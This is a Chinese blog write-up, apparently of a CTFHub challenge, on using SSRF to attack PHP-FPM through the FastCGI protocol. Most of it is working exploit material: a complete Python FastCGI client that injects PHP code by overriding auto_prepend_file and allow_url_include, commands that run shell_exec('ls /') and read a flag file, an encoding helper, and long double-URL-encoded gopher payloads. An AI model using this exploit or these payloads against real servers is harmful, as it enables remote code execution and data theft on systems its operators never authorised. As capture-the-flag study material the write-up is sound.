---
title: CTFHub中关于FastCGI协议的SSRF
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: [SSRF,CTF]
categories: [SSRF,CTF]
---



# 解题步骤

1. 监听9000端口，因为PHP-FPM默认监听9000端口

   ![image-20210719051814927](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png)

   exp如下：

   ```python
   #ssrf_fastcgi_fpm.py
   import socket
   import random
   import argparse
   import sys
   from io import BytesIO
   
   # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
   
   PY2 = True if sys.version_info.major == 2 else False
   
   
   def bchr(i):
       if PY2:
           return force_bytes(chr(i))
       else:
           return bytes([i])
   
   def bord(c):
       if isinstance(c, int):
           return c
       else:
           return ord(c)
   
   def force_bytes(s):
       if isinstance(s, bytes):
           return s
       else:
           return s.encode('utf-8', 'strict')
   
   def force_text(s):
       if issubclass(type(s), str):
           return s
       if isinstance(s, bytes):
           s = str(s, 'utf-8', 'strict')
       else:
           s = str(s)
       return s
   
   
   class FastCGIClient:
       """A Fast-CGI Client for Python"""
   
       # private
       __FCGI_VERSION = 1
   
       __FCGI_ROLE_RESPONDER = 1
       __FCGI_ROLE_AUTHORIZER = 2
       __FCGI_ROLE_FILTER = 3
   
       __FCGI_TYPE_BEGIN = 1
       __FCGI_TYPE_ABORT = 2
       __FCGI_TYPE_END = 3
       __FCGI_TYPE_PARAMS = 4
       __FCGI_TYPE_STDIN = 5
       __FCGI_TYPE_STDOUT = 6
       __FCGI_TYPE_STDERR = 7
       __FCGI_TYPE_DATA = 8
       __FCGI_TYPE_GETVALUES = 9
       __FCGI_TYPE_GETVALUES_RESULT = 10
       __FCGI_TYPE_UNKOWNTYPE = 11
   
       __FCGI_HEADER_SIZE = 8
   
       # request state
       FCGI_STATE_SEND = 1
       FCGI_STATE_ERROR = 2
       FCGI_STATE_SUCCESS = 3
   
       def __init__(self, host, port, timeout, keepalive):
           self.host = host
           self.port = port
           self.timeout = timeout
           if keepalive:
               self.keepalive = 1
           else:
               self.keepalive = 0
           self.sock = None
           self.requests = dict()
   
       def __connect(self):
           self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           self.sock.settimeout(self.timeout)
           self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
           # if self.keepalive:
           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
           # else:
           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
           try:
               self.sock.connect((self.host, int(self.port)))
           except socket.error as msg:
               self.sock.close()
               self.sock = None
               print(repr(msg))
               return False
           return True
   
       def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
           length = len(content)
           buf = bchr(FastCGIClient.__FCGI_VERSION) \
                  + bchr(fcgi_type) \
                  + bchr((requestid >> 8) & 0xFF) \
                  + bchr(requestid & 0xFF) \
                  + bchr((length >> 8) & 0xFF) \
                  + bchr(length & 0xFF) \
                  + bchr(0) \
                  + bchr(0) \
                  + content
           return buf
   
       def __encodeNameValueParams(self, name, value):
           nLen = len(name)
           vLen = len(value)
           record = b''
           if nLen < 128:
               record += bchr(nLen)
           else:
               record += bchr((nLen >> 24) | 0x80) \
                         + bchr((nLen >> 16) & 0xFF) \
                         + bchr((nLen >> 8) & 0xFF) \
                         + bchr(nLen & 0xFF)
           if vLen < 128:
               record += bchr(vLen)
           else:
               record += bchr((vLen >> 24) | 0x80) \
                         + bchr((vLen >> 16) & 0xFF) \
                         + bchr((vLen >> 8) & 0xFF) \
                         + bchr(vLen & 0xFF)
           return record + name + value
   
       def __decodeFastCGIHeader(self, stream):
           header = dict()
           header['version'] = bord(stream[0])
           header['type'] = bord(stream[1])
           header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
           header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
           header['paddingLength'] = bord(stream[6])
           header['reserved'] = bord(stream[7])
           return header
   
       def __decodeFastCGIRecord(self, buffer):
           header = buffer.read(int(self.__FCGI_HEADER_SIZE))
   
           if not header:
               return False
           else:
               record = self.__decodeFastCGIHeader(header)
               record['content'] = b''
   
               if 'contentLength' in record.keys():
                   contentLength = int(record['contentLength'])
                   record['content'] += buffer.read(contentLength)
               if 'paddingLength' in record.keys():
                   skiped = buffer.read(int(record['paddingLength']))
               return record
   
       def request(self, nameValuePairs={}, post=''):
           if not self.__connect():
               print('connect failure! please check your fasctcgi-server !!')
               return
   
           requestId = random.randint(1, (1 << 16) - 1)
           self.requests[requestId] = dict()
           request = b""
           beginFCGIRecordContent = bchr(0) \
                                    + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                    + bchr(self.keepalive) \
                                    + bchr(0) * 5
           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                                 beginFCGIRecordContent, requestId)
           paramsRecord = b''
           if nameValuePairs:
               for (name, value) in nameValuePairs.items():
                   name = force_bytes(name)
                   value = force_bytes(value)
                   paramsRecord += self.__encodeNameValueParams(name, value)
   
           if paramsRecord:
               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
   
           if post:
               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
   
           self.sock.send(request)
           self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
           self.requests[requestId]['response'] = b''
           return self.__waitForResponse(requestId)
   
       def __waitForResponse(self, requestId):
           data = b''
           while True:
               buf = self.sock.recv(512)
               if not len(buf):
                   break
               data += buf
   
           data = BytesIO(data)
           while True:
               response = self.__decodeFastCGIRecord(data)
               if not response:
                   break
               if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                       or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                   if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                       self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                   if requestId == int(response['requestId']):
                       self.requests[requestId]['response'] += response['content']
               if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                   self.requests[requestId]
           return self.requests[requestId]['response']
   
       def __repr__(self):
           return "fastcgi connect host:{} port:{}".format(self.host, self.port)
   
   
   if __name__ == '__main__':
       parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
       parser.add_argument('host', help='Target host, such as 127.0.0.1')
       parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
       parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
       parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
   
       args = parser.parse_args()
   
       client = FastCGIClient(args.host, args.port, 3, 0)
       params = dict()
       documentRoot = "/"
       uri = args.file
       content = args.code
       params = {
           'GATEWAY_INTERFACE': 'FastCGI/1.0',
           'REQUEST_METHOD': 'POST',
           'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
           'SCRIPT_NAME': uri,
           'QUERY_STRING': '',
           'REQUEST_URI': uri,
           'DOCUMENT_ROOT': documentRoot,
           'SERVER_SOFTWARE': 'php/fcgiclient',
           'REMOTE_ADDR': '127.0.0.1',
           'REMOTE_PORT': '9985',
           'SERVER_ADDR': '127.0.0.1',
           'SERVER_PORT': '80',
           'SERVER_NAME': "localhost",
           'SERVER_PROTOCOL': 'HTTP/1.1',
           'CONTENT_TYPE': 'application/text',
           'CONTENT_LENGTH': "%d" % len(content),
           'PHP_VALUE': 'auto_prepend_file = php://input',
           'PHP_ADMIN_VALUE': 'allow_url_include = On'
       }
       response = client.request(params, content)
   
   ```

   以`py fpm.py -c [php语句] -p port host path `格式执行即可

2. 首先执行`ls /`命令

   ```bash
   python ssrf_fastcgi_fpm.py -c "<?php var_dump(shell_exec('ls /'));?>" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php
   ```

   得到利用exp获得的攻击流量1.txt，用010editor打开![image-20210719052340479](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png)

   以十六进制文本的形式复制下来，用以下脚本进行url编码

   ```python
   a='''
   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00
   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41
   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43
   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F
   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49
   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F
   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45
   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E
   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69
   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00
   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45
   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F
   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52
   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52
   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46
   54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69
   65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52
   31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54
   45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56
   45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31
   0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B
   09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61
   6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52
   4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10
   43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C
   69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F
   4E 54 45 4E 54 5F 4C 45 4E 47 54 48 33 37 09 1F
   50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72
   65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70
   3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44
   4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75
   72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01
   04 11 C4 00 00 00 00 01 05 11 C4 00 25 00 00 3C
   3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68
   65 6C 6C 5F 65 78 65 63 28 27 6C 73 20 2F 27 29
   29 3B 3F 3E 01 05 11 C4 00 00 00 00
   
   
   '''
   a=a.replace('\n','')
   a=a.replace(' ','')
   b=''
   length=len(a)
   for i in range(0,length,2):
       b+='%'
       b+=a[i]
       b+=a[i+1]
   print(b)
   
   ```

   得到url编码后的攻击流量

   ```
   %01%01%11%C4%00%08%00%00%00%01%00%00%00%00%00%00%01%04%11%C4%01%E7%00%00%11%0B%47%41%54%45%57%41%59%5F%49%4E%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2F%31%2E%30%0E%04%52%45%51%55%45%53%54%5F%4D%45%54%48%4F%44%50%4F%53%54%0F%1B%53%43%52%49%50%54%5F%46%49%4C%45%4E%41%4D%45%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0B%1B%53%43%52%49%50%54%5F%4E%41%4D%45%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0C%00%51%55%45%52%59%5F%53%54%52%49%4E%47%0B%1B%52%45%51%55%45%53%54%5F%55%52%49%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0D%01%44%4F%43%55%4D%45%4E%54%5F%52%4F%4F%54%2F%0F%0E%53%45%52%56%45%52%5F%53%4F%46%54%57%41%52%45%70%68%70%2F%66%63%67%69%63%6C%69%65%6E%74%0B%09%52%45%4D%4F%54%45%5F%41%44%44%52%31%32%37%2E%30%2E%30%2E%31%0B%04%52%45%4D%4F%54%45%5F%50%4F%52%54%39%39%38%35%0B%09%53%45%52%56%45%52%5F%41%44%44%52%31%32%37%2E%30%2E%30%2E%31%0B%02%53%45%52%56%45%52%5F%50%4F%52%54%38%30%0B%09%53%45%52%56%45%52%5F%4E%41%4D%45%6C%6F%63%61%6C%68%6F%73%74%0F%08%53%45%52%56%45%52%5F%50%52%4F%54%4F%43%4F%4C%48%54%54%50%2F%31%2E%31%0C%10%43%4F%4E%54%45%4E%54%5F%54%59%50%45%61%70%70%6C%69%63%61%74%69%6F%6E%2F%74%65%78%74%0E%02%43%4F%4E%54%45%4E%54%5F%4C%45%4E%47%54%48%33%37%09%1F%50%48%50%5F%56%41%4C%55%45%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%20%3D%20%70%68%70%3A%2F%2F%69%6E%70%75%74%0F%16%50%48%50%5F%41%44%4D%49%4E%5F%56%41%4C%55%45%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%20%3D%20%4F%6E%01%04%11%C4%00%00%00%00%01%05%11%C4%00%25%00%00%3C%3F%70%68%70%20%76%61%72%5F%64%75%6D%70%28%73%68%65%6C%6C%5F%65%78%65%63%28%27%6C%73%20%2F%27%29%29%3B%3F%3E%01%05%11%C4%00%00%00%00
   ```

   但由于要进行两次请求，因此还要进行一次url编码，最终结果如下

   ```
   %2501%2501%2511%25C4%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2511%25C4%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2533%2537%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2511%25C4%2500%2500%2500%2500%2501%2505%2511%25C4%2500%2525%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%256C%2573%2520%252F%2527%2529%2529%253B%253F%253E%2501%2505%2511%25C4%2500%2500%2500%2500
   ```

3. 由于PHP-FPM默认监听9000端口，所以攻击的端口也为9000

   ![image-20210719053932114](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719053932114.png)

   成功执行

4. 接着进行同样的步骤执行`cat /flag_49b379d8b061225b3ed4bc32986b087f`

   两次url编码后的攻击流量为

   ```
   %2501%2501%2594%2577%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2594%2577%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2537%2535%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2594%2577%2500%2500%2500%2500%2501%2505%2594%2577%2500%254B%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%2563%2561%2574%2520%252F%2566%256C%2561%2567%255F%2534%2539%2562%2533%2537%2539%2564%2538%2562%2530%2536%2531%2532%2532%2535%2562%2533%2565%2564%2534%2562%2563%2533%2532%2539%2538%2536%2562%2530%2538%2537%2566%2527%2529%2529%253B%253F%253E%2501%2505%2594%2577%2500%2500%2500%2500
   ```

   成功执行

   ![image-20210719055237991](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719055237991.png)
   
5. 另外可以使用Gopherus这个工具，更简单一些

   ![image-20210719062324937](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062324937.png)

   ![image-20210719062711350](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719062711350.png)

   此处payload要再次进行编码才能使用

总结流程：

**1.探测开放端口（这道题不用）**

**2.本地构造攻击流量，通过监听端口然后url转码的形式**

**3.ssrf攻击**

> 参考
>
> https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/
>
> https://blog.csdn.net/mysteryflower/article/details/94386461
>
> https://blog.csdn.net/shreck66/article/details/50355729
>
> https://blog.csdn.net/rfrder/article/details/108589988

